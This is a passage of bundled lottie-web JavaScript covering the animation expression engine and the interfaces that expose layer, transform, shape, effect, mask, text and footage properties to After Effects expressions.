                      this.comp.renderedFrame / this.comp.globalData.frameRate),
                    _needsRandom && seedRandom(randSeed + time),
                    needsVelocity && (velocity = velocityAtTime(time)),
                    expression_function(),
                    (this.frameExpressionId = elem.globalData.frameId),
                    (scoped_bm_rt =
                      scoped_bm_rt.propType === propTypes.SHAPE
                        ? scoped_bm_rt.v
                        : scoped_bm_rt),
                    scoped_bm_rt)
              );
            }
            return (
              (executeExpression.__preventDeadCodeRemoval = [
                $bm_transform,
                anchorPoint,
                time,
                velocity,
                inPoint,
                outPoint,
                width,
                height,
                name,
                loop_in,
                loop_out,
                smooth,
                toComp,
                fromCompToSurface,
                toWorld,
                fromWorld,
                mask,
                position,
                rotation,
                scale,
                thisComp,
                numKeys,
                active,
                wiggle,
                loopInDuration,
                loopOutDuration,
                comp,
                lookAt,
                easeOut,
                easeIn,
                ease,
                nearestKey,
                key,
                text,
                textIndex,
                textTotal,
                selectorValue,
                framesToTime,
                timeToFrames,
                sourceRectAtTime,
                substring,
                substr,
                posterizeTime,
                index,
                globalData,
              ]),
              executeExpression
            );
          }
          return (
            (ob.initiateExpression = initiateExpression),
            (ob.__preventDeadCodeRemoval = [
              window,
              document,
              XMLHttpRequest,
              fetch,
              frames,
              $bm_neg,
              add,
              $bm_sum,
              $bm_sub,
              $bm_mul,
              $bm_div,
              $bm_mod,
              clamp,
              radians_to_degrees,
              degreesToRadians,
              degrees_to_radians,
              normalize,
              rgbToHsl,
              hslToRgb,
              linear,
              random,
              createPath,
              _lottieGlobal,
            ]),
            (ob.resetFrame = resetFrame),
            ob
          );
        })(),
        Expressions = (function () {
          var i = {};
          (i.initExpressions = a),
            (i.resetFrame = ExpressionManager.resetFrame);
          function a(o) {
            var s = 0,
              tt = [];
            function nt() {
              s += 1;
            }
            function ot() {
              (s -= 1), s === 0 && ft();
            }
            function st(ht) {
              tt.indexOf(ht) === -1 && tt.push(ht);
            }
            function ft() {
              var ht,
                gt = tt.length;
              for (ht = 0; ht < gt; ht += 1) tt[ht].release();
              tt.length = 0;
            }
            (o.renderer.compInterface = CompExpressionInterface(o.renderer)),
              o.renderer.globalData.projectInterface.registerComposition(
                o.renderer
              ),
              (o.renderer.globalData.pushExpression = nt),
              (o.renderer.globalData.popExpression = ot),
              (o.renderer.globalData.registerExpressionProperty = st);
          }
          return i;
        })(),
        MaskManagerInterface = (function () {
          function i(o, s) {
            (this._mask = o), (this._data = s);
          }
          Object.defineProperty(i.prototype, "maskPath", {
            get: function () {
              return (
                this._mask.prop.k && this._mask.prop.getValue(), this._mask.prop
              );
            },
          }),
            Object.defineProperty(i.prototype, "maskOpacity", {
              get: function () {
                return (
                  this._mask.op.k && this._mask.op.getValue(),
                  this._mask.op.v * 100
                );
              },
            });
          var a = function (s) {
            var tt = createSizedArray(s.viewData.length),
              nt,
              ot = s.viewData.length;
            for (nt = 0; nt < ot; nt += 1)
              tt[nt] = new i(s.viewData[nt], s.masksProperties[nt]);
            var st = function (ht) {
              for (nt = 0; nt < ot; ) {
                if (s.masksProperties[nt].nm === ht) return tt[nt];
                nt += 1;
              }
              return null;
            };
            return st;
          };
          return a;
        })(),
        ExpressionPropertyInterface = (function () {
          var i = { pv: 0, v: 0, mult: 1 },
            a = { pv: [0, 0, 0], v: [0, 0, 0], mult: 1 };
          function o(ot, st, ft) {
            Object.defineProperty(ot, "velocity", {
              get: function () {
                return st.getVelocityAtTime(st.comp.currentFrame);
              },
            }),
              (ot.numKeys = st.keyframes ? st.keyframes.length : 0),
              (ot.key = function (ht) {
                if (!ot.numKeys) return 0;
                var gt = "";
                "s" in st.keyframes[ht - 1]
                  ? (gt = st.keyframes[ht - 1].s)
                  : "e" in st.keyframes[ht - 2]
                  ? (gt = st.keyframes[ht - 2].e)
                  : (gt = st.keyframes[ht - 2].s);
                var St =
                  ft === "unidimensional"
                    ? new Number(gt)
                    : Object.assign({}, gt);
                return (
                  (St.time =
                    st.keyframes[ht - 1].t / st.elem.comp.globalData.frameRate),
                  (St.value = ft === "unidimensional" ? gt[0] : gt),
                  St
                );
              }),
              (ot.valueAtTime = st.getValueAtTime),
              (ot.speedAtTime = st.getSpeedAtTime),
              (ot.velocityAtTime = st.getVelocityAtTime),
              (ot.propertyGroup = st.propertyGroup);
          }
          function s(ot) {
            (!ot || !("pv" in ot)) && (ot = i);
            var st = 1 / ot.mult,
              ft = ot.pv * st,
              ht = new Number(ft);
            return (
              (ht.value = ft),
              o(ht, ot, "unidimensional"),
              function () {
                return (
                  ot.k && ot.getValue(),
                  (ft = ot.v * st),
                  ht.value !== ft &&
                    ((ht = new Number(ft)),
                    (ht.value = ft),
                    o(ht, ot, "unidimensional")),
                  ht
                );
              }
            );
          }
          function tt(ot) {
            (!ot || !("pv" in ot)) && (ot = a);
            var st = 1 / ot.mult,
              ft = (ot.data && ot.data.l) || ot.pv.length,
              ht = createTypedArray("float32", ft),
              gt = createTypedArray("float32", ft);
            return (
              (ht.value = gt),
              o(ht, ot, "multidimensional"),
              function () {
                ot.k && ot.getValue();
                for (var St = 0; St < ft; St += 1)
                  (gt[St] = ot.v[St] * st), (ht[St] = gt[St]);
                return ht;
              }
            );
          }
          function nt() {
            return i;
          }
          return function (ot) {
            return ot
              ? ot.propType === "unidimensional"
                ? s(ot)
                : tt(ot)
              : nt;
          };
        })(),
        TransformExpressionInterface = (function () {
          return function (i) {
            function a(ot) {
              switch (ot) {
                case "scale":
                case "Scale":
                case "ADBE Scale":
                case 6:
                  return a.scale;
                case "rotation":
                case "Rotation":
                case "ADBE Rotation":
                case "ADBE Rotate Z":
                case 10:
                  return a.rotation;
                case "ADBE Rotate X":
                  return a.xRotation;
                case "ADBE Rotate Y":
                  return a.yRotation;
                case "position":
                case "Position":
                case "ADBE Position":
                case 2:
                  return a.position;
                case "ADBE Position_0":
                  return a.xPosition;
                case "ADBE Position_1":
                  return a.yPosition;
                case "ADBE Position_2":
                  return a.zPosition;
                case "anchorPoint":
                case "AnchorPoint":
                case "Anchor Point":
                case "ADBE AnchorPoint":
                case 1:
                  return a.anchorPoint;
                case "opacity":
                case "Opacity":
                case 11:
                  return a.opacity;
                default:
                  return null;
              }
            }
            Object.defineProperty(a, "rotation", {
              get: ExpressionPropertyInterface(i.r || i.rz),
            }),
              Object.defineProperty(a, "zRotation", {
                get: ExpressionPropertyInterface(i.rz || i.r),
              }),
              Object.defineProperty(a, "xRotation", {
                get: ExpressionPropertyInterface(i.rx),
              }),
              Object.defineProperty(a, "yRotation", {
                get: ExpressionPropertyInterface(i.ry),
              }),
              Object.defineProperty(a, "scale", {
                get: ExpressionPropertyInterface(i.s),
              });
            var o, s, tt, nt;
            return (
              i.p
                ? (nt = ExpressionPropertyInterface(i.p))
                : ((o = ExpressionPropertyInterface(i.px)),
                  (s = ExpressionPropertyInterface(i.py)),
                  i.pz && (tt = ExpressionPropertyInterface(i.pz))),
              Object.defineProperty(a, "position", {
                get: function () {
                  return i.p ? nt() : [o(), s(), tt ? tt() : 0];
                },
              }),
              Object.defineProperty(a, "xPosition", {
                get: ExpressionPropertyInterface(i.px),
              }),
              Object.defineProperty(a, "yPosition", {
                get: ExpressionPropertyInterface(i.py),
              }),
              Object.defineProperty(a, "zPosition", {
                get: ExpressionPropertyInterface(i.pz),
              }),
              Object.defineProperty(a, "anchorPoint", {
                get: ExpressionPropertyInterface(i.a),
              }),
              Object.defineProperty(a, "opacity", {
                get: ExpressionPropertyInterface(i.o),
              }),
              Object.defineProperty(a, "skew", {
                get: ExpressionPropertyInterface(i.sk),
              }),
              Object.defineProperty(a, "skewAxis", {
                get: ExpressionPropertyInterface(i.sa),
              }),
              Object.defineProperty(a, "orientation", {
                get: ExpressionPropertyInterface(i.or),
              }),
              a
            );
          };
        })(),
        LayerExpressionInterface = (function () {
          function i(ht) {
            var gt = new Matrix();
            if (ht !== void 0) {
              var St = this._elem.finalTransform.mProp.getValueAtTime(ht);
              St.clone(gt);
            } else {
              var vt = this._elem.finalTransform.mProp;
              vt.applyToMatrix(gt);
            }
            return gt;
          }
          function a(ht, gt) {
            var St = this.getMatrix(gt);
            return (
              (St.props[12] = 0),
              (St.props[13] = 0),
              (St.props[14] = 0),
              this.applyPoint(St, ht)
            );
          }
          function o(ht, gt) {
            var St = this.getMatrix(gt);
            return this.applyPoint(St, ht);
          }
          function s(ht, gt) {
            var St = this.getMatrix(gt);
            return (
              (St.props[12] = 0),
              (St.props[13] = 0),
              (St.props[14] = 0),
              this.invertPoint(St, ht)
            );
          }
          function tt(ht, gt) {
            var St = this.getMatrix(gt);
            return this.invertPoint(St, ht);
          }
          function nt(ht, gt) {
            if (this._elem.hierarchy && this._elem.hierarchy.length) {
              var St,
                vt = this._elem.hierarchy.length;
              for (St = 0; St < vt; St += 1)
                this._elem.hierarchy[St].finalTransform.mProp.applyToMatrix(ht);
            }
            return ht.applyToPointArray(gt[0], gt[1], gt[2] || 0);
          }
          function ot(ht, gt) {
            if (this._elem.hierarchy && this._elem.hierarchy.length) {
              var St,
                vt = this._elem.hierarchy.length;
              for (St = 0; St < vt; St += 1)
                this._elem.hierarchy[St].finalTransform.mProp.applyToMatrix(ht);
            }
            return ht.inversePoint(gt);
          }
          function st(ht) {
            var gt = new Matrix();
            if (
              (gt.reset(),
              this._elem.finalTransform.mProp.applyToMatrix(gt),
              this._elem.hierarchy && this._elem.hierarchy.length)
            ) {
              var St,
                vt = this._elem.hierarchy.length;
              for (St = 0; St < vt; St += 1)
                this._elem.hierarchy[St].finalTransform.mProp.applyToMatrix(gt);
              return gt.inversePoint(ht);
            }
            return gt.inversePoint(ht);
          }
          function ft() {
            return [1, 1, 1, 1];
          }
          return function (ht) {
            var gt;
            function St(Ct) {
              _t.mask = new MaskManagerInterface(Ct, ht);
            }
            function vt(Ct) {
              _t.effect = Ct;
            }
            function _t(Ct) {
              switch (Ct) {
                case "ADBE Root Vectors Group":
                case "Contents":
                case 2:
                  return _t.shapeInterface;
                case 1:
                case 6:
                case "Transform":
                case "transform":
                case "ADBE Transform Group":
                  return gt;
                case 4:
                case "ADBE Effect Parade":
                case "effects":
                case "Effects":
                  return _t.effect;
                case "ADBE Text Properties":
                  return _t.textInterface;
                default:
                  return null;
              }
            }
            (_t.getMatrix = i),
              (_t.invertPoint = ot),
              (_t.applyPoint = nt),
              (_t.toWorld = o),
              (_t.toWorldVec = a),
              (_t.fromWorld = tt),
              (_t.fromWorldVec = s),
              (_t.toComp = o),
              (_t.fromComp = st),
              (_t.sampleImage = ft),
              (_t.sourceRectAtTime = ht.sourceRectAtTime.bind(ht)),
              (_t._elem = ht),
              (gt = TransformExpressionInterface(ht.finalTransform.mProp));
            var Et = getDescriptor(gt, "anchorPoint");
            return (
              Object.defineProperties(_t, {
                hasParent: {
                  get: function () {
                    return ht.hierarchy.length;
                  },
                },
                parent: {
                  get: function () {
                    return ht.hierarchy[0].layerInterface;
                  },
                },
                rotation: getDescriptor(gt, "rotation"),
                scale: getDescriptor(gt, "scale"),
                position: getDescriptor(gt, "position"),
                opacity: getDescriptor(gt, "opacity"),
                anchorPoint: Et,
                anchor_point: Et,
                transform: {
                  get: function () {
                    return gt;
                  },
                },
                active: {
                  get: function () {
                    return ht.isInRange;
                  },
                },
              }),
              (_t.startTime = ht.data.st),
              (_t.index = ht.data.ind),
              (_t.source = ht.data.refId),
              (_t.height = ht.data.ty === 0 ? ht.data.h : 100),
              (_t.width = ht.data.ty === 0 ? ht.data.w : 100),
              (_t.inPoint = ht.data.ip / ht.comp.globalData.frameRate),
              (_t.outPoint = ht.data.op / ht.comp.globalData.frameRate),
              (_t._name = ht.data.nm),
              (_t.registerMaskInterface = St),
              (_t.registerEffectsInterface = vt),
              _t
            );
          };
        })(),
        propertyGroupFactory = (function () {
          return function (i, a) {
            return function (o) {
              return (o = o === void 0 ? 1 : o), o <= 0 ? i : a(o - 1);
            };
          };
        })(),
        PropertyInterface = (function () {
          return function (i, a) {
            var o = { _name: i };
            function s(tt) {
              return (tt = tt === void 0 ? 1 : tt), tt <= 0 ? o : a(tt - 1);
            }
            return s;
          };
        })(),
        EffectsExpressionInterface = (function () {
          var i = { createEffectsInterface: a };
          function a(tt, nt) {
            if (tt.effectsManager) {
              var ot = [],
                st = tt.data.ef,
                ft,
                ht = tt.effectsManager.effectElements.length;
              for (ft = 0; ft < ht; ft += 1)
                ot.push(
                  o(st[ft], tt.effectsManager.effectElements[ft], nt, tt)
                );
              var gt = tt.data.ef || [],
                St = function (_t) {
                  for (ft = 0, ht = gt.length; ft < ht; ) {
                    if (
                      _t === gt[ft].nm ||
                      _t === gt[ft].mn ||
                      _t === gt[ft].ix
                    )
                      return ot[ft];
                    ft += 1;
                  }
                  return null;
                };
              return (
                Object.defineProperty(St, "numProperties", {
                  get: function () {
                    return gt.length;
                  },
                }),
                St
              );
            }
            return null;
          }
          function o(tt, nt, ot, st) {
            function ft(_t) {
              for (var Et = tt.ef, Ct = 0, Pt = Et.length; Ct < Pt; ) {
                if (_t === Et[Ct].nm || _t === Et[Ct].mn || _t === Et[Ct].ix)
                  return Et[Ct].ty === 5 ? gt[Ct] : gt[Ct]();
                Ct += 1;
              }
              throw new Error();
            }
            var ht = propertyGroupFactory(ft, ot),
              gt = [],
              St,
              vt = tt.ef.length;
            for (St = 0; St < vt; St += 1)
              tt.ef[St].ty === 5
                ? gt.push(
                    o(
                      tt.ef[St],
                      nt.effectElements[St],
                      nt.effectElements[St].propertyGroup,
                      st
                    )
                  )
                : gt.push(s(nt.effectElements[St], tt.ef[St].ty, st, ht));
            return (
              tt.mn === "ADBE Color Control" &&
                Object.defineProperty(ft, "color", {
                  get: function () {
                    return gt[0]();
                  },
                }),
              Object.defineProperties(ft, {
                numProperties: {
                  get: function () {
                    return tt.np;
                  },
                },
                _name: { value: tt.nm },
                propertyGroup: { value: ht },
              }),
              (ft.enabled = tt.en !== 0),
              (ft.active = ft.enabled),
              ft
            );
          }
          function s(tt, nt, ot, st) {
            var ft = ExpressionPropertyInterface(tt.p);
            function ht() {
              return nt === 10 ? ot.comp.compInterface(tt.p.v) : ft();
            }
            return (
              tt.p.setGroupProperty &&
                tt.p.setGroupProperty(PropertyInterface("", st)),
              ht
            );
          }
          return i;
        })(),
        ShapePathInterface = (function () {
          return function (a, o, s) {
            var tt = o.sh;
            function nt(st) {
              return st === "Shape" ||
                st === "shape" ||
                st === "Path" ||
                st === "path" ||
                st === "ADBE Vector Shape" ||
                st === 2
                ? nt.path
                : null;
            }
            var ot = propertyGroupFactory(nt, s);
            return (
              tt.setGroupProperty(PropertyInterface("Path", ot)),
              Object.defineProperties(nt, {
                path: {
                  get: function () {
                    return tt.k && tt.getValue(), tt;
                  },
                },
                shape: {
                  get: function () {
                    return tt.k && tt.getValue(), tt;
                  },
                },
                _name: { value: a.nm },
                ix: { value: a.ix },
                propertyIndex: { value: a.ix },
                mn: { value: a.mn },
                propertyGroup: { value: s },
              }),
              nt
            );
          };
        })(),
        ShapeExpressionInterface = (function () {
          function i(Et, Ct, Pt) {
            var bt = [],
              xt,
              yt = Et ? Et.length : 0;
            for (xt = 0; xt < yt; xt += 1)
              Et[xt].ty === "gr"
                ? bt.push(o(Et[xt], Ct[xt], Pt))
                : Et[xt].ty === "fl"
                ? bt.push(s(Et[xt], Ct[xt], Pt))
                : Et[xt].ty === "st"
                ? bt.push(ot(Et[xt], Ct[xt], Pt))
                : Et[xt].ty === "tm"
                ? bt.push(st(Et[xt], Ct[xt], Pt))
                : Et[xt].ty === "tr" ||
                  (Et[xt].ty === "el"
                    ? bt.push(ht(Et[xt], Ct[xt], Pt))
                    : Et[xt].ty === "sr"
                    ? bt.push(gt(Et[xt], Ct[xt], Pt))
                    : Et[xt].ty === "sh"
                    ? bt.push(ShapePathInterface(Et[xt], Ct[xt], Pt))
                    : Et[xt].ty === "rc"
                    ? bt.push(St(Et[xt], Ct[xt], Pt))
                    : Et[xt].ty === "rd"
                    ? bt.push(vt(Et[xt], Ct[xt], Pt))
                    : Et[xt].ty === "rp"
                    ? bt.push(_t(Et[xt], Ct[xt], Pt))
                    : Et[xt].ty === "gf"
                    ? bt.push(tt(Et[xt], Ct[xt], Pt))
                    : bt.push(nt(Et[xt], Ct[xt])));
            return bt;
          }
          function a(Et, Ct, Pt) {
            var bt,
              xt = function ($t) {
                for (var kt = 0, Rt = bt.length; kt < Rt; ) {
                  if (
                    bt[kt]._name === $t ||
                    bt[kt].mn === $t ||
                    bt[kt].propertyIndex === $t ||
                    bt[kt].ix === $t ||
                    bt[kt].ind === $t
                  )
                    return bt[kt];
                  kt += 1;
                }
                return typeof $t == "number" ? bt[$t - 1] : null;
              };
            (xt.propertyGroup = propertyGroupFactory(xt, Pt)),
              (bt = i(Et.it, Ct.it, xt.propertyGroup)),
              (xt.numProperties = bt.length);
            var yt = ft(
              Et.it[Et.it.length - 1],
              Ct.it[Ct.it.length - 1],
              xt.propertyGroup
            );
            return (
              (xt.transform = yt),
              (xt.propertyIndex = Et.cix),
              (xt._name = Et.nm),
              xt
            );
          }
          function o(Et, Ct, Pt) {
            var bt = function ($t) {
              switch ($t) {
                case "ADBE Vectors Group":
                case "Contents":
                case 2:
                  return bt.content;
                default:
                  return bt.transform;
              }
            };
            bt.propertyGroup = propertyGroupFactory(bt, Pt);
            var xt = a(Et, Ct, bt.propertyGroup),
              yt = ft(
                Et.it[Et.it.length - 1],
                Ct.it[Ct.it.length - 1],
                bt.propertyGroup
              );
            return (
              (bt.content = xt),
              (bt.transform = yt),
              Object.defineProperty(bt, "_name", {
                get: function () {
                  return Et.nm;
                },
              }),
              (bt.numProperties = Et.np),
              (bt.propertyIndex = Et.ix),
              (bt.nm = Et.nm),
              (bt.mn = Et.mn),
              bt
            );
          }
          function s(Et, Ct, Pt) {
            function bt(xt) {
              return xt === "Color" || xt === "color"
                ? bt.color
                : xt === "Opacity" || xt === "opacity"
                ? bt.opacity
                : null;
            }
            return (
              Object.defineProperties(bt, {
                color: { get: ExpressionPropertyInterface(Ct.c) },
                opacity: { get: ExpressionPropertyInterface(Ct.o) },
                _name: { value: Et.nm },
                mn: { value: Et.mn },
              }),
              Ct.c.setGroupProperty(PropertyInterface("Color", Pt)),
              Ct.o.setGroupProperty(PropertyInterface("Opacity", Pt)),
              bt
            );
          }
          function tt(Et, Ct, Pt) {
            function bt(xt) {
              return xt === "Start Point" || xt === "start point"
                ? bt.startPoint
                : xt === "End Point" || xt === "end point"
                ? bt.endPoint
                : xt === "Opacity" || xt === "opacity"
                ? bt.opacity
                : null;
            }
            return (
              Object.defineProperties(bt, {
                startPoint: { get: ExpressionPropertyInterface(Ct.s) },
                endPoint: { get: ExpressionPropertyInterface(Ct.e) },
                opacity: { get: ExpressionPropertyInterface(Ct.o) },
                type: {
                  get: function () {
                    return "a";
                  },
                },
                _name: { value: Et.nm },
                mn: { value: Et.mn },
              }),
              Ct.s.setGroupProperty(PropertyInterface("Start Point", Pt)),
              Ct.e.setGroupProperty(PropertyInterface("End Point", Pt)),
              Ct.o.setGroupProperty(PropertyInterface("Opacity", Pt)),
              bt
            );
          }
          function nt() {
            function Et() {
              return null;
            }
            return Et;
          }
          function ot(Et, Ct, Pt) {
            var bt = propertyGroupFactory(Rt, Pt),
              xt = propertyGroupFactory(kt, bt);
            function yt(It) {
              Object.defineProperty(kt, Et.d[It].nm, {
                get: ExpressionPropertyInterface(Ct.d.dataProps[It].p),
              });
            }
            var wt,
              $t = Et.d ? Et.d.length : 0,
              kt = {};
            for (wt = 0; wt < $t; wt += 1)
              yt(wt), Ct.d.dataProps[wt].p.setGroupProperty(xt);
            function Rt(It) {
              return It === "Color" || It === "color"
                ? Rt.color
                : It === "Opacity" || It === "opacity"
                ? Rt.opacity
                : It === "Stroke Width" || It === "stroke width"
                ? Rt.strokeWidth
                : null;
            }
            return (
              Object.defineProperties(Rt, {
                color: { get: ExpressionPropertyInterface(Ct.c) },
                opacity: { get: ExpressionPropertyInterface(Ct.o) },
                strokeWidth: { get: ExpressionPropertyInterface(Ct.w) },
                dash: {
                  get: function () {
                    return kt;
                  },
                },
                _name: { value: Et.nm },
                mn: { value: Et.mn },
              }),
              Ct.c.setGroupProperty(PropertyInterface("Color", bt)),
              Ct.o.setGroupProperty(PropertyInterface("Opacity", bt)),
              Ct.w.setGroupProperty(PropertyInterface("Stroke Width", bt)),
              Rt
            );
          }
          function st(Et, Ct, Pt) {
            function bt(yt) {
              return yt === Et.e.ix || yt === "End" || yt === "end"
                ? bt.end
                : yt === Et.s.ix
                ? bt.start
                : yt === Et.o.ix
                ? bt.offset
                : null;
            }
            var xt = propertyGroupFactory(bt, Pt);
            return (
              (bt.propertyIndex = Et.ix),
              Ct.s.setGroupProperty(PropertyInterface("Start", xt)),
              Ct.e.setGroupProperty(PropertyInterface("End", xt)),
              Ct.o.setGroupProperty(PropertyInterface("Offset", xt)),
              (bt.propertyIndex = Et.ix),
              (bt.propertyGroup = Pt),
              Object.defineProperties(bt, {
                start: { get: ExpressionPropertyInterface(Ct.s) },
                end: { get: ExpressionPropertyInterface(Ct.e) },
                offset: { get: ExpressionPropertyInterface(Ct.o) },
                _name: { value: Et.nm },
              }),
              (bt.mn = Et.mn),
              bt
            );
          }
          function ft(Et, Ct, Pt) {
            function bt(yt) {
              return Et.a.ix === yt || yt === "Anchor Point"
                ? bt.anchorPoint
                : Et.o.ix === yt || yt === "Opacity"
                ? bt.opacity
                : Et.p.ix === yt || yt === "Position"
                ? bt.position
                : Et.r.ix === yt ||
                  yt === "Rotation" ||
                  yt === "ADBE Vector Rotation"
                ? bt.rotation
                : Et.s.ix === yt || yt === "Scale"
                ? bt.scale
                : (Et.sk && Et.sk.ix === yt) || yt === "Skew"
                ? bt.skew
                : (Et.sa && Et.sa.ix === yt) || yt === "Skew Axis"
                ? bt.skewAxis
                : null;
            }
            var xt = propertyGroupFactory(bt, Pt);
            return (
              Ct.transform.mProps.o.setGroupProperty(
                PropertyInterface("Opacity", xt)
              ),
              Ct.transform.mProps.p.setGroupProperty(
                PropertyInterface("Position", xt)
              ),
              Ct.transform.mProps.a.setGroupProperty(
                PropertyInterface("Anchor Point", xt)
              ),
              Ct.transform.mProps.s.setGroupProperty(
                PropertyInterface("Scale", xt)
              ),
              Ct.transform.mProps.r.setGroupProperty(
                PropertyInterface("Rotation", xt)
              ),
              Ct.transform.mProps.sk &&
                (Ct.transform.mProps.sk.setGroupProperty(
                  PropertyInterface("Skew", xt)
                ),
                Ct.transform.mProps.sa.setGroupProperty(
                  PropertyInterface("Skew Angle", xt)
                )),
              Ct.transform.op.setGroupProperty(
                PropertyInterface("Opacity", xt)
              ),
              Object.defineProperties(bt, {
                opacity: {
                  get: ExpressionPropertyInterface(Ct.transform.mProps.o),
                },
                position: {
                  get: ExpressionPropertyInterface(Ct.transform.mProps.p),
                },
                anchorPoint: {
                  get: ExpressionPropertyInterface(Ct.transform.mProps.a),
                },
                scale: {
                  get: ExpressionPropertyInterface(Ct.transform.mProps.s),
                },
                rotation: {
                  get: ExpressionPropertyInterface(Ct.transform.mProps.r),
                },
                skew: {
                  get: ExpressionPropertyInterface(Ct.transform.mProps.sk),
                },
                skewAxis: {
                  get: ExpressionPropertyInterface(Ct.transform.mProps.sa),
                },
                _name: { value: Et.nm },
              }),
              (bt.ty = "tr"),
              (bt.mn = Et.mn),
              (bt.propertyGroup = Pt),
              bt
            );
          }
          function ht(Et, Ct, Pt) {
            function bt(wt) {
              return Et.p.ix === wt
                ? bt.position
                : Et.s.ix === wt
                ? bt.size
                : null;
            }
            var xt = propertyGroupFactory(bt, Pt);
            bt.propertyIndex = Et.ix;
            var yt = Ct.sh.ty === "tm" ? Ct.sh.prop : Ct.sh;
            return (
              yt.s.setGroupProperty(PropertyInterface("Size", xt)),
              yt.p.setGroupProperty(PropertyInterface("Position", xt)),
              Object.defineProperties(bt, {
                size: { get: ExpressionPropertyInterface(yt.s) },
                position: { get: ExpressionPropertyInterface(yt.p) },
                _name: { value: Et.nm },
              }),
              (bt.mn = Et.mn),
              bt
            );
          }
          function gt(Et, Ct, Pt) {
            function bt(wt) {
              return Et.p.ix === wt
                ? bt.position
                : Et.r.ix === wt
                ? bt.rotation
                : Et.pt.ix === wt
                ? bt.points
                : Et.or.ix === wt || wt === "ADBE Vector Star Outer Radius"
                ? bt.outerRadius
                : Et.os.ix === wt
                ? bt.outerRoundness
                : Et.ir &&
                  (Et.ir.ix === wt || wt === "ADBE Vector Star Inner Radius")
                ? bt.innerRadius
                : Et.is && Et.is.ix === wt
                ? bt.innerRoundness
                : null;
            }
            var xt = propertyGroupFactory(bt, Pt),
              yt = Ct.sh.ty === "tm" ? Ct.sh.prop : Ct.sh;
            return (
              (bt.propertyIndex = Et.ix),
              yt.or.setGroupProperty(PropertyInterface("Outer Radius", xt)),
              yt.os.setGroupProperty(PropertyInterface("Outer Roundness", xt)),
              yt.pt.setGroupProperty(PropertyInterface("Points", xt)),
              yt.p.setGroupProperty(PropertyInterface("Position", xt)),
              yt.r.setGroupProperty(PropertyInterface("Rotation", xt)),
              Et.ir &&
                (yt.ir.setGroupProperty(PropertyInterface("Inner Radius", xt)),
                yt.is.setGroupProperty(
                  PropertyInterface("Inner Roundness", xt)
                )),
              Object.defineProperties(bt, {
                position: { get: ExpressionPropertyInterface(yt.p) },
                rotation: { get: ExpressionPropertyInterface(yt.r) },
                points: { get: ExpressionPropertyInterface(yt.pt) },
                outerRadius: { get: ExpressionPropertyInterface(yt.or) },
                outerRoundness: { get: ExpressionPropertyInterface(yt.os) },
                innerRadius: { get: ExpressionPropertyInterface(yt.ir) },
                innerRoundness: { get: ExpressionPropertyInterface(yt.is) },
                _name: { value: Et.nm },
              }),
              (bt.mn = Et.mn),
              bt
            );
          }
          function St(Et, Ct, Pt) {
            function bt(wt) {
              return Et.p.ix === wt
                ? bt.position
                : Et.r.ix === wt
                ? bt.roundness
                : Et.s.ix === wt ||
                  wt === "Size" ||
                  wt === "ADBE Vector Rect Size"
                ? bt.size
                : null;
            }
            var xt = propertyGroupFactory(bt, Pt),
              yt = Ct.sh.ty === "tm" ? Ct.sh.prop : Ct.sh;
            return (
              (bt.propertyIndex = Et.ix),
              yt.p.setGroupProperty(PropertyInterface("Position", xt)),
              yt.s.setGroupProperty(PropertyInterface("Size", xt)),
              yt.r.setGroupProperty(PropertyInterface("Rotation", xt)),
              Object.defineProperties(bt, {
                position: { get: ExpressionPropertyInterface(yt.p) },
                roundness: { get: ExpressionPropertyInterface(yt.r) },
                size: { get: ExpressionPropertyInterface(yt.s) },
                _name: { value: Et.nm },
              }),
              (bt.mn = Et.mn),
              bt
            );
          }
          function vt(Et, Ct, Pt) {
            function bt(wt) {
              return Et.r.ix === wt || wt === "Round Corners 1"
                ? bt.radius
                : null;
            }
            var xt = propertyGroupFactory(bt, Pt),
              yt = Ct;
            return (
              (bt.propertyIndex = Et.ix),
              yt.rd.setGroupProperty(PropertyInterface("Radius", xt)),
              Object.defineProperties(bt, {
                radius: { get: ExpressionPropertyInterface(yt.rd) },
                _name: { value: Et.nm },
              }),
              (bt.mn = Et.mn),
              bt
            );
          }
          function _t(Et, Ct, Pt) {
            function bt(wt) {
              return Et.c.ix === wt || wt === "Copies"
                ? bt.copies
                : Et.o.ix === wt || wt === "Offset"
                ? bt.offset
                : null;
            }
            var xt = propertyGroupFactory(bt, Pt),
              yt = Ct;
            return (
              (bt.propertyIndex = Et.ix),
              yt.c.setGroupProperty(PropertyInterface("Copies", xt)),
              yt.o.setGroupProperty(PropertyInterface("Offset", xt)),
              Object.defineProperties(bt, {
                copies: { get: ExpressionPropertyInterface(yt.c) },
                offset: { get: ExpressionPropertyInterface(yt.o) },
                _name: { value: Et.nm },
              }),
              (bt.mn = Et.mn),
              bt
            );
          }
          return function (Et, Ct, Pt) {
            var bt;
            function xt(wt) {
              if (typeof wt == "number")
                return (
                  (wt = wt === void 0 ? 1 : wt), wt === 0 ? Pt : bt[wt - 1]
                );
              for (var $t = 0, kt = bt.length; $t < kt; ) {
                if (bt[$t]._name === wt) return bt[$t];
                $t += 1;
              }
              return null;
            }
            function yt() {
              return Pt;
            }
            return (
              (xt.propertyGroup = propertyGroupFactory(xt, yt)),
              (bt = i(Et, Ct, xt.propertyGroup)),
              (xt.numProperties = bt.length),
              (xt._name = "Contents"),
              xt
            );
          };
        })(),
        TextExpressionInterface = (function () {
          return function (i) {
            var a;
            function o(s) {
              switch (s) {
                case "ADBE Text Document":
                  return o.sourceText;
                default:
                  return null;
              }
            }
            return (
              Object.defineProperty(o, "sourceText", {
                get: function () {
                  i.textProperty.getValue();
                  var tt = i.textProperty.currentData.t;
                  return (
                    (!a || tt !== a.value) &&
                      ((a = new String(tt)),
                      (a.value = tt || new String(tt)),
                      Object.defineProperty(a, "style", {
                        get: function () {
                          return { fillColor: i.textProperty.currentData.fc };
                        },
                      })),
                    a
                  );
                },
              }),
              o
            );
          };
        })();
      function _typeof(i) {
        "@babel/helpers - typeof";
        return (
          typeof Symbol == "function" && typeof Symbol.iterator == "symbol"
            ? (_typeof = function (o) {
                return typeof o;
              })
            : (_typeof = function (o) {
                return o &&
                  typeof Symbol == "function" &&
                  o.constructor === Symbol &&
                  o !== Symbol.prototype
                  ? "symbol"
                  : typeof o;
              }),
          _typeof(i)
        );
      }
      var FootageInterface = (function () {
          var i = function (s) {
              var tt = "",
                nt = s.getFootageData();
              function ot() {
                return (tt = ""), (nt = s.getFootageData()), st;
              }
              function st(ft) {
                if (nt[ft])
                  return (
                    (tt = ft), (nt = nt[ft]), _typeof(nt) === "object" ? st : nt
                  );
                var ht = ft.indexOf(tt);
                if (ht !== -1) {
                  var gt = parseInt(ft.substr(ht + tt.length), 10);
                  return (nt = nt[gt]), _typeof(nt) === "object" ? st : nt;
                }
                return "";
